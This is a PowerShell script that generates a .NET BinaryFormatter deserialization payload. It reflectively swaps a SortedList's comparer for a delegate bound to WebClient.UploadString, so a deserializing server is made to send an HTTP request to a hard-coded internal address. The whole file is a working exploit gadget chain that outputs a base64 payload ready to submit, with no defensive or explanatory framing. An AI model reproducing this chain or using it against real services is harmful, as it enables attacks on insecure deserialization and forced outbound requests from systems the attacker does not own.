# --- Configuration ---
$targetUrl = "http://10.230.200.240:8080/"
$dummyData = "test"

# --- Payload Construction ---
Write-Host "[*] Building WebClient Deserialization payload..." -ForegroundColor Cyan

# 1. Create a WebClient instance and get the UploadString method
$webClient = New-Object System.Net.WebClient
$uploadMethod = $webClient.GetType().GetMethod('UploadString', [Type[]]@([string], [string]))

# 2. Create a Comparison<string> delegate bound to the WebClient instance
$maliciousDelegate = [System.Delegate]::CreateDelegate([System.Comparison[string]], $webClient, $uploadMethod)

# 3. Load the internal ComparisonComparer<string> type via Reflection
$mscorlib = [System.Reflection.Assembly]::Load("mscorlib")
$comparisonComparerType = $mscorlib.GetType("System.Collections.Generic.ComparisonComparer``1").MakeGenericType([string])

# 4. Create an instance of ComparisonComparer<string> with the malicious delegate
$comparisonDelegateType = [System.Comparison[string]]
$constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
$maliciousComparer = $constructor.Invoke(@($maliciousDelegate))

# 5. Create a SortedList and populate it with our target URL and dummy data
# We use the default comparer initially to avoid triggering the payload locally.
$sortedList = New-Object System.Collections.Generic.SortedList[string, string] ([System.Collections.Generic.Comparer[string]]::Default)
$sortedList.Add($targetUrl, $dummyData)
$sortedList.Add("http://dummy.com", "dummy") # Add a second item to force a comparison during deserialization

# 6. Swap the internal comparer with our malicious one
$comparerField = $sortedList.GetType().GetField('comparer', [System.Reflection.BindingFlags]'NonPublic, Instance')
if (-not $comparerField) {
    $comparerField = $sortedList.GetType().GetField('_comparer', [System.Reflection.BindingFlags]'NonPublic, Instance')
}
$comparerField.SetValue($sortedList, $maliciousComparer)

# --- Serialization ---
Write-Host "[*] Serializing object..." -ForegroundColor Cyan
try {
    $formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
    $ms = New-Object System.IO.MemoryStream
    $formatter.Serialize($ms, $sortedList)
    
    $payload = $ms.ToArray()
    if ($payload.Length -eq 0) { throw "Serialization returned empty." }

    $base64Payload = [Convert]::ToBase64String($payload)
    Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
    Write-Host "Base64 Payload: $base64Payload"
} catch {
    Write-Host "[-] Error: $_" -ForegroundColor Red
}
